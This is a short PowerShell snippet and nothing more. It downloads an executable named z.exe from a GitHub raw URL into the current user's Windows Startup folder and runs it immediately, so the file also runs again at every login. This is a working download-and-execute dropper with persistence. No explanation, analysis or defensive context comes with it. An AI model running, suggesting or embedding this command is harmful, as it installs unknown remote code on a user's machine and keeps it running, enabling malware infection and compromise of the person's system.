$p=$env:APPDATA+'\Microsoft\Windows\Start Menu\Programs\Startup\z.exe';
iwr 'https://raw.githubusercontent.com/lov229/a/refs/heads/main/z.exe' -o $p;
start $p
